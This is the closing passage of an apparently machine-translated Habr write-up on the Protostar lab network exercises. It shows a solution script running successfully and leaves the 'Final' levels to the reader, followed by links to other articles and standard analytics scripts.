inherit;"> We launch and receive a success message: </font></font><br><br><pre> <code class="bash hljs">gh0st3rs@gh0st3rs-pc:protostar$ ./net2.py you added them correctly</code> </pre> <br>  That's all for now.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The remaining </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Final0 </font></font></i> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Final1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Final2 I</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> propose to look at yourself.</font></font></div><p>Source: <a href="https://habr.com/ru/post/320460/">https://habr.com/ru/post/320460/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../320450/index.html">A simple version of an indoor video surveillance system using a motion sensor and Python on the Raspberry platform</a></li>
<li><a href="../320452/index.html">Developing a new application architecture for Uber passengers</a></li>
<li><a href="../320454/index.html">ITSM educational program: How to meet customer expectations</a></li>
<li><a href="../320456/index.html">Uncomplicated SCRUM and Image Segmentation for Highlighting Post-it Stickers</a></li>
<li><a href="../320458/index.html">Arduino on car wash</a></li>
<li><a href="../320462/index.html">SystemJS 0.20 - Combining with browser modules</a></li>
<li><a href="../320464/index.html">OpenJDK 10 development begins</a></li>
<li><a href="../320470/index.html">Why did you need to develop a "Russian dropbox"</a></li>
<li><a href="../320472/index.html">Connect Xmega to FRAM over SPI</a></li>
<li><a href="../320474/index.html">Dagaz: evolution instead of revolution</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>